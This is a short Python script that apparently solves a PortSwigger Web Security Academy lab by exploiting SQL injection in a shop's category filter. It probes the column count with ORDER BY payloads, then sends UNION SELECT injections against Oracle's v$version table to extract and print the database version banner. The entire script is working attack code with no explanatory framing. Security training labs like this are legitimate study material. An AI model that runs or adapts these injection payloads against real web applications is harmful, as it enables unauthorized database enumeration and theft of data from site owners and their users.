import requests
import sys
from bs4 import BeautifulSoup


def determine_columns(lab_url):
    num_of_columns = 0
    for i in range(1, 20):
        response = requests.get(f"{lab_url}/filter?category=x' ORDER BY {i}--")
        if response.status_code == 500:
            num_of_columns = i - 1
            break
    return num_of_columns


def extract_text(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    version_string = soup.find('tbody').get_text().strip()

    #Removing the extra space between lines
    formatted_version_string = ""
    for line in version_string.split("\n\n"):
        formatted_version_string += "\n" + line.strip()

    return formatted_version_string


def get_db_version(lab_url, num_of_columns):
    for i in range(num_of_columns):
        payload = ["NULL"] * num_of_columns
        payload[i] = "banner"
        payload = ",".join(payload)
        url = f"{lab_url}/filter?category=x' UNION SELECT {payload} FROM v$version--"
        response = requests.get(url)
        if response.status_code == 200:
            return extract_text(response)


def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <url>")
        print(f"Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    lab_url = sys.argv[1].rstrip('/')
    num_of_columns = determine_columns(lab_url)
    print(f"Database Version Information: {get_db_version(lab_url, num_of_columns)}")


if __name__ == "__main__":
    main()
